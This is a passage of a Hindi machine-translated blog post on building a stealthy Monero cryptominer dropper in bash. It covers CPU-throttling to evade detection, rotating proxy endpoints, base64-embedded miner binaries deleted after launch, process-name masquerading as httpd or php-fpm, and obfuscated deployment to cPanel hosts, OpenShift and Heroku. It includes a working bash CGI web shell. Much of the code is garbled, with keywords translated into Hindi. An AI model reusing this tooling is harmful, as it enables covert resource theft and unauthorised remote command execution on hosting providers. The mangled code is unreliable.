डाउनस्ट्रीम के बीच का अंतर यह है कि अपस्ट्रीम लक्ष्य को अधिकतम करना है<em> प्रदर्शन</em> , जबकि हमारा लक्ष्य अधिकतम करना है<em> दक्षता और अस्पष्टता</em> , हम सिस्टम से आगे नहीं बढ़ना चाहते हैं, हम सेवा व्यवधान के बिना थोड़ा जोंक करना चाहते हैं।<sup id="fnref:monerominer"><a class=fnref href="#fndef:monerominer">[3]</a></sup></p><p> इसके लिए हमें पर्यावरण की अधिक बारीक समझ की आवश्यकता है,<code>l2/l3</code> प्रोसेसर, रैम और कोर की कैश संरचना, और वर्तमान प्रोसेसर<em> औसत</em> लोड और सीपीयू<em> प्रयोग</em>. मैंने एक बनाने का प्रयास किया<a href="https://en.wikipedia.org/wiki/Finite-state_machine"> राज्य मशीन</a> बैश में जो न्यूनतम से शुरू होगा और विभिन्न विन्यासों को धीरे-धीरे औसत पर व्यवस्थित करने का प्रयास करेगा। वह एक था<strong> विशाल</strong> प्रयास की बर्बादी<a href="https://en.wikipedia.org/wiki/Technical_debt"> तकनीकी ऋण</a> जो बहुत जल्दी दिवालिया हो गया और ज्यादातर कोडबेस में अवशेष के साथ छोड़ दिया गया था।</p><p> इस सभी ऑटो ट्यूनिंग जंबो को फ्रैक करें, हमने मेजबान उपयोग/लोड के आधार पर माइनर को नींद में डाल दिया है, इसके लिए आवश्यक माइनर संशोधनों<code>sleep</code> थ्रेड्स यील्ड के बीच, और कॉन्फ़िगरेशन वॉचडॉग में कुछ सुधार<sup id="fnref:configwatch"><a class=fnref href="#fndef:configwatch">[4]</a></sup> , जो हमें रनटाइम पर स्लीपिंग अमाउंट को फिर से लोड करने की अनुमति देगा। तर्क बहुत अधिक सरल है और इस तरह दिखता है:</p><ul><li><p> यदि उपयोग $TARGET_USAGE (± त्रुटि का मार्जिन) से ऊपर/नीचे है, तो नींद बढ़ाएं/घटाएं</p><li><p> यदि औसत भार के भीतर<code>1m</code> $TARGET_LOAD से ऊपर/नीचे है खनन रोकें/फिर से शुरू करें</p></ul><h3 id=connection ><a class=header-anchor href="#connection"> संबंध</a></h3><p> हमारे बैश राउंडअप में हमने कनेक्शन के लिए उपयोगिताओं को दिखाया। हमें इनकी आवश्यकता क्यों है? क्योंकि हमें विविधता चाहिए; कॉन्फ़िगरेशन में एक एंडपॉइंट को बस हार्ड कोडिंग लंबे समय तक नहीं टिकेगी, जब कुछ संदिग्ध दिखता है, और नेटवर्क गतिविधि होती है, तो आईपी को ध्वजांकित किया जाता है।</p><p> शुरुआत में हमने कुछ तरीकों के साथ प्रयोग किया:</p><ul><li><p> का उपयोग करते हुए<a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains"> प्रॉक्सी चेन</a> माइनर नेटवर्क कॉल्स को ओवरलोड करने के लिए, लेकिन इसके लिए माइनर को डायनेमिक लाइब्रेरी के साथ बनाने की आवश्यकता थी, और आपको उन्हें पेलोड के साथ शिप करना था, इसलिए यह अव्यावहारिक था।</p><li><p> चल रहा है<a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost"> आगे की सुरंग</a> माइनर के साथ कंधे से कंधा मिलाकर: इसमें बहुत अधिक कॉन्फ़िगरेशन ओवरहेड था, क्योंकि अब हम प्रत्येक परिनियोजन पर दो प्रक्रियाओं को कॉन्फ़िगर कर रहे थे, जिसमें अधिक बग थे।</p></ul><p>अंत में हम बस समापन बिंदुओं की एक सूची शिपिंग के साथ बस गए, एक बैश चर में संग्रहीत, यादृच्छिक रूप से एक को चुनना। कनेक्शन निश्चित रूप से एन्क्रिप्टेड थे। ये समापन बिंदु क्या हैं? प्रॉक्सी को फारवर्डर जो खनिकों की नौकरियों को संभालेगा।</p><img alt="" src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png"/><p> हमें ए . की आवश्यकता क्यों है<a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy"> खनन प्रॉक्सी</a> ? मैं वास्तव में ~ १०० समवर्ती कनेक्शनों से पहले कभी नहीं गया था, इसलिए नेटवर्क लोड के लिए एक प्रॉक्सी वास्तव में आवश्यक नहीं था, लेकिन यह हैशिंग एल्गोरिथ्म पर बातचीत करने के लिए सुविधाजनक था, और विभिन्न खनिकों को अलग-अलग कठिनाई लक्ष्य प्रदान करने के लिए, खनिकों को काम करने से रोकने के लिए<strong> कठिनाई</strong> ऐसे लक्ष्य जो उन्हें पूरा करने में बहुत अधिक समय लेते हैं और अधूरे कार्यों पर गणना को बर्बाद करने के जोखिम से बचते हैं।<sup id="fnref:difficulty"><a class=fnref href="#fndef:difficulty">[5]</a></sup> पूल सॉफ़्टवेयर को भी कुछ संशोधनों की आवश्यकता थी क्योंकि यह सादे http अनुरोधों पर प्रॉक्सी होने के लिए खुशी से विज्ञापन कर रहा था ...<em> जिसे टाइम-आउट करना था</em> , और एक कांटा जोड़ा अभिगम नियंत्रण इसलिए हम उस पर अपने मॉड्स आधारित करते हैं।<sup id="fnref:stratumprotocol"><a class=fnref href="#fndef:stratumprotocol">[6]</a></sup></p><h3 id=editing_json ><a class=header-anchor href="#editing_json"> संपादन जोंस</a></h3><p> एक json फ़ाइल में संशोधनों को लागू करना बस बैश के साथ हमें कुछ env var प्रतिस्थापन, और कुछ रेगेक्स के साथ मिला। शुरू में हम एक पर भरोसा कर रहे थे<code>envsubst</code> चर लागू करने के लिए बाइनरी, फिर हम पूर्ण बैश गए<sup id="fnref:fullbash"><a class=fnref href="#fndef:fullbash">[7]</a></sup> इस तर्क के साथ:</p><ul><li><p> कॉन्फ़िगरेशन टेम्पलेट पढ़ें</p><li><p> सभी उद्धरणों को एक बहुत ही गूढ़ स्ट्रिंग से बदलें (जैसे<code>_#_#</code>)</p><li><p><code>eval</code> नमूना</p><li><p> सभी गूढ़ घटनाओं को वापस उद्धरणों से बदलें</p></ul><p> उप प्रक्रियाओं से बचने के अलावा, एक और फायदा यह है कि हमें अपने टेम्प्लेट में पूर्ण बैश क्षमताएं मिलती हैं। टेम्प्लेट के बिना पढ़ने और लिखने के लिए, हमें बैश रेगेक्स क्षमताओं पर निर्भर रहना होगा:</p><pre><code class="bash hljs">cc_rgx=<span class=hljs-string >'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function ><span class=hljs-title >change_config</span></span>() {
	<span class=hljs-built_in >local</span> subs
	<span class=hljs-keyword >while</span><span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span><span class=hljs-keyword >if</span> [ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> != <span class=hljs-string >"<span class=hljs-variable > ${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword > फिर</span>
			[[ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> =~ <span class=hljs-variable > $cc_rgx</span>  ]]
मैच = (<span class=hljs-string >"<span class=hljs-variable > ${BASH_REMATCH[@]}</span>"</span> )
[ -एन<span class=hljs-string >"<span class=hljs-variable > ${मैचों[3]}</span>"</span>  -ए<span class=hljs-string >"<span class=hljs-variable > ${2:0:1}</span>"</span> != <span class=hljs-string >"\""</span>  ] &amp;&amp;
उप =<span class=hljs-string >"\"<span class=hljs-variable > $2</span>\""</span>  ||
उप =<span class=hljs-string >"<span class=hljs-variable > $2</span>"</span> 
कॉन्फिग =<span class=hljs-variable > ${CONFIG/<span class=hljs-variable > ${मैचों[0]}</span>/<span class=hljs-variable > ${मैचों[1]}</span>$उप<span class=hljs-variable > ${मैचों[5]}</span>}</span><span class=hljs-built_in > टूटना</span><span class=hljs-keyword >fi</span><span class=hljs-keyword > किया हुआ</span> &lt;&lt;&lt;<span class=hljs-string >"<span class=hljs-subst > $(प्रिंटफ '%s'<span class=hljs-string >"<span class=hljs-variable > $CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}

<span class=hljs-comment > ## आउटपुट माइनर कॉन्फिग वैल्यू $1 अउद्धृत</span> 
gc_rgx=<span class=hljs-string > ' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function ><span class=hljs-title > get_config</span></span>() {
	<span class=hljs-keyword > जबकि</span><span class=hljs-built_in > पढ़ना</span>  एल;<span class=hljs-keyword > करना</span><span class=hljs-keyword > अगर</span> [ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> != <span class=hljs-string >"<span class=hljs-variable > ${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword > फिर</span>
			[[ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> =~ <span class=hljs-variable > $gc_rgx</span>  ]]
[ -एन<span class=hljs-string >"<span class=hljs-variable > ${BASH_REMATCH[2]}</span>"</span> ] &amp;&amp;
				<span class=hljs-built_in > printf</span><span class=hljs-string > '%एस'</span><span class=hljs-string >"<span class=hljs-variable > ${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in > printf</span><span class=hljs-string > '%एस'</span><span class=hljs-string >"<span class=hljs-variable > ${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in > टूटना</span><span class=hljs-keyword >fi</span><span class=hljs-keyword > किया हुआ</span> &lt;&lt;&lt;<span class=hljs-string >"<span class=hljs-subst > $(प्रिंटफ '%s'<span class=hljs-string >"<span class=hljs-variable > $CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}</code></pre><p> यह हमें केवल एकल पंक्तियों को संपादित करने की अनुमति देता है, बहु-पंक्ति प्रविष्टियों के लिए यह केवल पहली पंक्ति पर विचार करता है..लेकिन यह हमारे उपयोग के मामले के लिए पर्याप्त है।</p><h2 id=runtime ><a class=header-anchor href="#runtime"> क्रम</a></h2><p> हमारा रनटाइम कैसा दिखता है? हमारे पास एक मुख्य बैश प्रक्रिया है जो मुख्य लूप को निष्पादित करती है, फिर माइनर उप-प्रक्रिया, सीपीयू मॉनिटर उप-प्रक्रिया, लॉकर और ट्यूनर। यह लगभग एक मुट्ठी भर है।</p><p> पहले हम यह सुनिश्चित करना चाहते हैं कि अगर कुछ गलत हो जाता है, तो हम कोई गड़बड़ी नहीं छोड़ते हैं, इसका मतलब है कि हम समाप्ति पर सफाई करने के लिए बैश ट्रैप का उपयोग करते हैं</p><pre><code class="bash hljs"><span class=hljs-built_in >trap</span><span class=hljs-string >"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code>  पुनरावृत्ति को रोकने के लिए जाल को खोल देता है। जाल सभी नौकरियों को मारता है और काम के माहौल को हटा देता है।</p><p> यह माइनर शुरू करने का समय है, जिसे बेस 64 एन्कोडिंग में बैश वैरिएबल के रूप में संग्रहीत किया जाता है। हम इसे फाइल सिस्टम पर डंप करते हैं, फिर हम कॉन्फिगर को डंप करते हैं, माइनर को निष्पादित करते हैं, और माइनर और कॉन्फिगर दोनों को हटाते हैं। लिनक्स पर आप एक चल रही प्रक्रिया के निष्पादन योग्य को हटा सकते हैं, (विंडोज़ पर इसकी अनुमति नहीं है)।<sup id="fnref:memoryondemand"><a class=fnref href="#fndef:memoryondemand">[8]</a></sup>  जब माइनर चल रहा होता है, तो फाइल सिस्टम पर बस एक होता है<code>.. /</code>  a . के साथ निर्देशिका<code>b64</code>  इसमें लिंक।</p><pre><code class="bash hljs"><span class=hljs-comment >## put a file $1 into a var $2</span><span class=hljs-function ><span class=hljs-title >fileToVar</span></span>(){
    <span class=hljs-built_in >declare</span> -n tmpd=<span class=hljs-string >"<span class=hljs-variable > $2</span>"</span>  &amp;&amp; tmpd=$(b64e<span class=hljs-string >"<span class=hljs-variable > $1</span>"</span>) &amp;&amp; <span class=hljs-built_in > वापसी</span><span class=hljs-keyword > अगर</span>  [-z<span class=hljs-string >"<span class=hljs-variable > $tmpd</span>"</span> ]; <span class=hljs-keyword > फिर</span><span class=hljs-built_in > लॉग</span><span class=hljs-string >"gobbling in array"</span><span class=hljs-built_in >eval</span><span class=hljs-string >"<span class=hljs-variable > $2</span> = 1"</span><span class=hljs-comment > ## खाली चेक से बचें</span> 
        घिसा हुआ [<span class=hljs-variable > $2</span> ]=$(b64e<span class=hljs-string >"<span class=hljs-variable > $1</span>"</span>)
    <span class=hljs-keyword > अन्यथा</span><span class=hljs-built_in > वापसी</span> 1 <span class=hljs-comment > ## असाइनमेंट उद्धृत न करें अन्यथा राम को रिहा नहीं किया जाता है</span><span class=hljs-keyword >fi</span>
}
<span class=hljs-comment > ## एक var $1 को फ़ाइल $2 . में डालें</span><span class=hljs-function ><span class=hljs-title > varToFile</span></span>(){
    <span class=hljs-keyword > अगर</span>  [ -एन<span class=hljs-string >"<span class=hljs-variable > $VERBOSE</span>"</span> ]; <span class=hljs-keyword > फिर</span><span class=hljs-keyword > अगर</span><span class=hljs-built_in > घोषित</span>  -एन 2&gt;&gt;<span class=hljs-variable > ${VERBOSE}</span> &amp;&amp; <span class=hljs-built_in >eval</span><span class=hljs-string >"b64d &lt;&lt;&lt;\"\$<span class=hljs-variable > $1</span> \" 1&gt;\"<span class=hljs-variable > $2</span> \" 2&gt;&gt;<span class=hljs-variable > ${VERBOSE}</span>"</span>; <span class=hljs-keyword > फिर</span><span class=hljs-built_in > वापसी</span><span class=hljs-keyword > अन्यथा</span><span class=hljs-comment > # लॉग "सरणी से डंपिंग"</span><span class=hljs-built_in >eval</span><span class=hljs-string >"b64d &lt;&lt;&lt;\"\${gobbled[<span class=hljs-variable > $1</span> ]}\" 1&gt;\"<span class=hljs-variable > $2</span> \" 2&gt;&gt;<span class=hljs-variable > ${VERBOSE}</span>"</span> &amp;&amp; <span class=hljs-built_in > वापसी</span><span class=hljs-keyword >fi</span><span class=hljs-built_in > वापसी</span> 1
    <span class=hljs-keyword > अन्यथा</span><span class=hljs-keyword > अगर</span><span class=hljs-built_in > घोषित</span>  -एन &amp;&amp;<span class=hljs-built_in >eval</span><span class=hljs-string >"b64d &lt;&lt;&lt;\"\$<span class=hljs-variable > $1</span>\" &gt;\"<span class=hljs-variable > $2</span>\""</span>; <span class=hljs-keyword > फिर</span><span class=hljs-built_in > वापसी</span><span class=hljs-keyword > अन्यथा</span><span class=hljs-comment > # लॉग "सरणी से डंपिंग"</span><span class=hljs-built_in >eval</span><span class=hljs-string >"b64d &lt;&lt;&lt;\"\${gobbled[<span class=hljs-variable > $1</span>]}\" &gt;\"<span class=hljs-variable > $2</span>\""</span> &amp;&amp; <span class=hljs-built_in > वापसी</span><span class=hljs-keyword >fi</span><span class=hljs-built_in > वापसी</span> 1
    <span class=hljs-keyword >fi</span>
}</code></pre><p>खनिक को एन्कोड करते समय बैश के साथ सामना करने वाला एक पागल कर देने वाला प्रश्न यह है कि एक चर को उद्धरण के साथ एक उप-वर्ग के साथ असाइन करना<code>myvar="$(something)"</code> स्मृति उपयोग में स्थायी वृद्धि का कारण बनता है, इसे डीबग करना मुश्किल था और वास्तव में ऐसा व्यवहार करने का कारण नहीं मिला है, वैसे भी असाइनमेंट को निर्विवाद होना चाहिए। इसके बजाय डिकोडिंग किया जाता है<em> हेस्ट्रिंग्स</em> जो अस्थायी फ़ाइलों पर एक अमूर्त है, चर को एक फ़ाइल में डंप किया जाता है जिसे फिर प्रक्रिया में वापस पाइप किया जाता है।</p><p> माइनर लॉन्ग रनिंग लूप:</p><ul><li><p> जबकि सच</p><ul><li><p> खनिक बंद करो</p><li><p> कॉन्फ़िगरेशन हटाएं</p><li><p> खनिक शुरू करो</p><li><p> जबकि सच</p><ul><li><p> डेमॉन शुरू करो</p><ul><li><p> जब खनिक चल रहा हो</p><ul><li><p> खनिक से आउटपुट पढ़ें</p><li><p> आउटपुट लाइन के आधार पर माइनर एक्शन चुनें</p></ul></ul><li><p> अगर माइनर नहीं चल रहा है: ब्रेक</p></ul><li><p> नींद</p></ul></ul><p> आउटपुट लाइन कुछ रेगेक्स के खिलाफ मेल खाती है:</p><pre><code class="bash hljs">act_rgx=<span class=hljs-string >'(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p> डेमॉन उन मामलों को संभालता है जहां</p><ul><li><p> समापन बिंदु से कनेक्शन त्रुटि देता है (एक नया यादृच्छिक समापन बिंदु चुनें)</p><li><p> हैशिंग एल्गोरिथम बदलता है (नींद का समय और एड-हॉक कॉन्फ़िगरेशन समायोजित करें)</p><li><p> खनिक की समस्याएं (खनिक को पुनरारंभ करें)।</p></ul><p> थोड़ी देर के लिए कमांड और कंट्रोल डैशबोर्ड के लिए समर्थन था, जो मैन्युअल पुनरारंभ को ट्रिगर करने की इजाजत देता था, हालांकि इसका उपयोग कम से कम था, इसे छोड़ दिया गया था, और इसके समापन बिंदुओं को वैकल्पिक पूल कनेक्शन से बदल दिया गया था, पुनरारंभ प्रक्रिया भी अस्थिर, जटिल थी। .. तकनीकी ऋण का एक और उदाहरण। हालाँकि इसने एक अद्यतन पेलोड को फिर से लाने और मक्खी पर सभी कॉन्फ़िगरेशन को फिर से सेटअप करने की अनुमति दी, जो कि बहुत अच्छा था, परम ट्रैम्पोलिन।</p><h2 id=debugging ><a class=header-anchor href="#debugging"> डिबगिंग</a></h2><p> तीन मुख्य उपयोगिताएँ हैं</p><ul><li><p> कोड ब्लॉक के आसपास ट्रेसिंग को सक्षम/अक्षम करें (हम एक चर में एक बी 64 एन्कोडेड बाइनरी का पता नहीं लगाना चाहते हैं ..)</p><li><p> लॉग स्वरूपण के लिए एक सरल कार्य</p><li><p>एक ध्वज जो माइनर शुरू होने पर रनटाइम पर वर्बोज़ लॉगिंग को सक्रिय करेगा।</p><ul><li><p> फाइल करता है<code>.debug</code>  मौजूद?</p><ul><li><p> वर्बोज़ लॉगिंग सक्षम करें</p></ul></ul></ul><h2 id=target_deployments ><a class=header-anchor href="#target_deployments"> लक्ष्य परिनियोजन</a></h2><p> इस सेटअप का परीक्षण 3 प्रकार के मेजबानों पर किया गया है:</p><h3 id=self_hosted_containers_or_vms ><a class=header-anchor href="#self_hosted_containers_or_vms"> स्वयं होस्ट किए गए कंटेनर या वीएम</a></h3><p> कई होस्टिंग प्रदाता खनन पसंद नहीं करते हैं क्योंकि सीपीयू संसाधनों को कई उपयोगकर्ताओं के बीच साझा किया जाता है, और खनन सॉफ्टवेयर आसानी से बाकी उपयोगकर्ताओं के प्रदर्शन को प्रभावित करने वाले होस्ट नोड को धीमा कर सकता है। सीपीयू उपयोगकर्ता समय असीमित होने पर भी यह सच हो सकता है, क्योंकि हैशिंग एल्गोरिदम सीपीयू की सभी कैशिंग परतों को संतृप्त कर सकता है यदि कैश को सभी सीपीयू कोर के बीच साझा किया जाता है।</p><p> हम अपने का उपयोग करना चाहेंगे<em> निष्पक्ष</em>  प्रतिबंधित किए बिना संसाधनों का हिस्सा, यह हमारे स्टील्थ ड्रॉपर के लिए एक अच्छा उपयोग-मामला है क्योंकि यह होस्ट उपयोग जागरूक है, जिसका अर्थ है कि यह<em> चाहिए</em>  [एयूपी] के भीतर रहें। स्व-होस्ट किए गए परिनियोजन के साथ काम करते समय कोई अतिरिक्त कदम नहीं है, केवल लॉन्चर स्क्रिप्ट, शायद बूट अनुक्रम में जोड़ा जा सकता है या मैन्युअल रूप से लॉन्च किया जा सकता है।</p><h3 id=cpanel_based_web_hosting ><a class=header-anchor href="#cpanel_based_web_hosting"> cPanel आधारित वेब होस्टिंग</a></h3><p> वेब होस्टिंग सदस्यता योजनाएं ज्यादातर [cPanel] के माध्यम से पेश की जाती हैं। फिर से हम व्यक्तिगत सदस्यता योजनाओं का उपयोग कर रहे हैं जिनकी उचित संसाधन सीमाएँ हैं, दूसरी ओर किसी भी मुफ्त योजना की हास्यास्पद सीमाएँ हैं<sup id="fnref:freehostinglimits"><a class=fnref href="#fndef:freehostinglimits">[9]</a></sup> . cPanel आपको विभिन्न फ़ाइल एक्सटेंशन के लिए हैंडलर को परिभाषित करने की अनुमति देता है, यह हमें शेल स्क्रिप्ट को निष्पादित करने की अनुमति देता है<a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface"> सीजीआई</a>  सर्वर पर अपलोड की गई शेल स्क्रिप्ट के खिलाफ http अनुरोध के साथ। इस तरह के इंटरफेस वेब-शैल की तरह दिखते हैं<sup id="fnref:cpanelssh"><a class=fnref href="#fndef:cpanelssh">[10]</a></sup> . एक साधारण बैश वेब शेल</p><pre><code class="bash hljs"><span class=hljs-comment ># without content encoding the request response won't be honored</span><span class=hljs-built_in >echo</span> -e <span class=hljs-string >'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment >## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable >$IFS</span>
IFS=<span class=hljs-string >'=&amp;'</span>
parm=(<span class=hljs-variable >$QUERY_STRING</span>)
IFS=<span class=hljs-variable >$saveIFS</span><span class=hljs-keyword >for</span> ((i=0; i&lt;<span class=hljs-variable >${#parm[@]}</span>; i+=2))
<span class=hljs-keyword >do</span><span class=hljs-built_in >declare</span> var_<span class=hljs-variable >${parm[i]}</span>=<span class=hljs-variable >${parm[i+1]}</span><span class=hljs-keyword >done</span><span class=hljs-comment >## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string >"<span class=hljs-variable > ${var_path//+/ }</span>"</span><span class=hljs-built_in > निर्यात</span>  पथ =<span class=hljs-string >".:<span class=hljs-variable > $पथ</span>"</span> 
. /dev/shm/srv/utils/load.env &amp;&gt;/dev/null

<span class=hljs-keyword > अगर</span><span class=hljs-built_in > घोषित</span>  -एफ<span class=hljs-string >"<span class=hljs-variable > ${url_encoded/\%20*}</span>"</span> 1&gt;/dev/null; <span class=hljs-keyword > फिर</span><span class=hljs-comment > ## -n का उपयोग न करें, bcompat के लिए fd को पुनर्निर्देशित करें</span><span class=hljs-built_in > printf</span><span class=hljs-string > '%बी'</span><span class=hljs-string >"<span class=hljs-variable > ${url_encoded//%/\\x}</span>"</span>  &gt; / टीएमपी /<span class=hljs-variable > ${SERVER_NAME}</span> .src
<span class=hljs-keyword > अन्यथा</span><span class=hljs-keyword > अगर</span><span class=hljs-built_in > अंतर्निहित</span><span class=hljs-string >"<span class=hljs-variable > ${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword > फिर</span><span class=hljs-built_in > printf</span><span class=hljs-string > '%बी'</span><span class=hljs-string >"<span class=hljs-variable > ${url_encoded//%/\\x}</span>"</span>  &gt; / टीएमपी /<span class=hljs-variable > ${SERVER_NAME}</span> .src
    <span class=hljs-keyword > अन्यथा</span><span class=hljs-built_in > printf</span><span class=hljs-string > 'निष्पादन% बी'</span><span class=hljs-string >"<span class=hljs-variable > ${url_encoded//%/\\x}</span>"</span>  &gt; / टीएमपी /<span class=hljs-variable > ${SERVER_NAME}</span> .src
    <span class=hljs-keyword >fi</span><span class=hljs-keyword >fi</span> 
. /टीएमपी/<span class=hljs-variable > ${SERVER_NAME}</span> .src</code></pre><p> केवल बिल्टिन पर भरोसा करना बेहतर है क्योंकि वेब जेलों में अतिरिक्त प्रक्रियाओं की अनुमति नहीं दी जा सकती है, लेकिन यह हमेशा संभव है<code>exec</code> जो हमें अधिकांश कमांड लाइन उपयोगिताओं का उपयोग करने की अनुमति देता है। अधिकांश वेब शेल अन्य स्क्रिप्टिंग भाषाओं जैसे पायथन या पीएचपी में लिखे गए हैं क्योंकि आपको फोर्किंग के बारे में चिंता करने की ज़रूरत नहीं है।</p><p> एक cpanel वातावरण में खनिक प्रक्रिया के लिए एक स्थिर नाम का उपयोग करना बेहतर होता है, जैसे<code>httpd</code> या<code>php-fpm</code> चूंकि<code>cgi</code> मल्टी प्रोसेसिंग पर आधारित है, इसलिए सर्वर हमेशा इस तरह नामित कई प्रक्रियाओं से भरे होते हैं, हालांकि एक सावधान पर्यवेक्षक को ध्यान देना चाहिए<em> मल्टी-थ्रेडेड</em> उपयोग पैटर्न जो निश्चित रूप से पर्ल, पीएचपी, रूबी, या पायथन जैसी भाषाओं के लिए आम (या संभव) नहीं है!</p><p> प्रक्रियाओं की डिफ़ॉल्ट रूप से एक समय सीमा भी होती है, (1 घंटा, 1 दिन, आदि), इसके लिए हम केवल एक क्रॉन जॉब का उपयोग करते हैं जो ड्रॉपर को पुनरारंभ करता है।</p><p> इसके लिए बहुत सारे मैनुअल संपादन की आवश्यकता होती है, इसे स्वचालित करने के लिए cpanel एपीआई दुर्भाग्य से अंतिम उपयोगकर्ताओं के सामने नहीं आता है, इसलिए वेब होस्टिंग हमारे माइनर ड्रॉपर के लिए एक भद्दा और उबाऊ लक्ष्य है।</p><h3 id=web_environments ><a class=header-anchor href="#web_environments"> वेब वातावरण</a></h3><p> वहां<em> सास</em> वे प्रदाता जिनके पास एक कंटेनर के साथ एक वेब संपादक है, जैसे<a href="with a free tier before getting acquired by amazon"> क्लाउड 9</a> , [कोडएनीवेयर], [कोडेंवी]। यहां ड्रॉपर को तैनात करना आसान है (आपके पास एक पूर्ण वातावरण है), लेकिन इसे चालू रखना एक बोझ है, क्योंकि कोई भी इंटरैक्टिव वेब संपादक वेब पेज बंद होने के तुरंत बाद अपना सत्र समाप्त कर देता है, और इसके परिणामस्वरूप कंटेनर सो जाता है (जब तक कि आप बेशक वेतन)।</p><p>इसे दरकिनार करने का मतलब केवल यह हो सकता है कि हमें सत्रों को खुला रखना है, [कठपुतली] के साथ कुछ स्क्रिप्टिंग ने वांछित परिणाम प्राप्त किया है, लेकिन लंबे समय तक चलने, मेमोरी लीक होने, फूला हुआ एसपीए वेब पेज निश्चित रूप से अनाकर्षक हैं और चोरी-छिपे नहीं हैं, क्योंकि प्रदाता बैकएंड से, 24/7 खुला एक सत्र निश्चित रूप से संदिग्ध लगेगा। वास्तव में, वेब वातावरण भी भद्दे और उबाऊ लक्ष्य हैं।</p><h3 id=free_apps_services ><a class=header-anchor href="#free_apps_services"> मुफ्त ऐप्स सेवाएं</a></h3><p> यह मुख्य रूप से है<a href="when it used to have a free tier"> ओपनशिफ्ट</a><sup id="fnref:openshift"><a class=fnref href="#fndef:openshift">[11]</a></sup> और [हेरोकू]। ओपनशिफ्ट, कुबेरनेट्स को तैनात करने के लिए कुछ सरल था, लेकिन कॉन्फ़िगरेशन मंथन से भरा, यहां एक अंश है:</p><pre><code class="sh hljs"><span class=hljs-built_in >export</span> PATH=.:<span class=hljs-variable >$PATH</span>

[ -z <span class=hljs-string >"<span class=hljs-variable > $ओसी_पीआरजे</span>"</span> ] &amp;&amp; { <span class=hljs-built_in > गूंज</span><span class=hljs-string >"no account data provided"</span>; <span class=hljs-built_in > बाहर जाएं</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable > $obfs</span> ] ||
    { <span class=hljs-built_in > गूंज</span><span class=hljs-string >"obfs utility not found!"</span>; <span class=hljs-built_in > बाहर जाएं</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable > $लांचर</span> ] ||
    { <span class=hljs-built_in > गूंज</span><span class=hljs-string >"launcher script not found!"</span>; <span class=hljs-built_in > बाहर जाएं</span> 1; }

ctroot=<span class=hljs-variable > ${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment > ## माइनर को शुरू करने वाली सेवा को रूटफ़्स में /etc/services.d में ऐप नाम दिया गया है</span> 
स्क्रिप्टपथ =<span class=hljs-string >"rootfs/etc/services.d/app/run"</span> 
प्रकार =<span class=hljs-variable > ${HRK_TYPE:-कार्यकर्ता}</span> 
आईएमजी=$(महासागर-समापन बिंदु)/<span class=hljs-variable > $ओसी_पीआरजे</span>/<span class=hljs-variable > $ओसी_एपीपी</span> 
टीएसपीथ =/tmp/oc-tmp-apprun
प्रीपेन्ड =<span class=hljs-string >"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment > ## नई लाइन से सावधान रहें ^^^</span><span class=hljs-built_in > सीडी</span><span class=hljs-variable > $ctroot</span> || { <span class=hljs-built_in > गूंज</span><span class=hljs-string >"couldn't find ct build directory"</span>; <span class=hljs-built_in > बाहर जाएं</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in > गूंज</span><span class=hljs-string > 'वर्स फ़ाइल खाली!'</span> ; }
वार्स =<span class=hljs-variable > ${VARS//$'\n'/ }</span> 
वार्स =<span class=hljs-variable > ${VARS//\\/\\\\}</span><span class=hljs-comment > ## बच निकलते हैं</span> 
स्क्रिप्ट = $ (बिल्ली)<span class=hljs-variable > $लांचर</span>  | पूंछ +2 | sed -r<span class=hljs-string > '/ ^ इको "निर्यात \\$/a'</span><span class=hljs-string >"<span class=hljs-variable > $VARS</span>"</span><span class=hljs-string >' \\'</span> )
बिल्ली &lt;&lt;&lt;<span class=hljs-string >"<span class=hljs-variable > $स्क्रिप्ट</span>"</span> &gt; <span class=hljs-variable > $tspath</span><span class=hljs-variable > $obfs</span><span class=hljs-variable > $tspath</span> 
[-z<span class=hljs-string >"<span class=hljs-variable > ${tspath}</span> .obfs"</span> ] &amp;&amp; { <span class=hljs-built_in > गूंज</span><span class=hljs-string >"obfs file not found?"</span>; <span class=hljs-built_in > बाहर जाएं</span> 1; }
cat &lt;&lt;&lt; <span class=hljs-string >"$prepend<span class=hljs-subst > $(बिल्ली<span class=hljs-string >"<span class=hljs-variable > ${tspath}</span> .obfs"</span>)</span>"</span> &gt; <span class=hljs-variable > $स्क्रिप्टपथ</span><span class=hljs-built_in > कार्यकारी</span>  खुद (चाहिए<span class=hljs-built_in >eval</span> )
चामोद +x<span class=hljs-variable > $स्क्रिप्टपथ</span> 

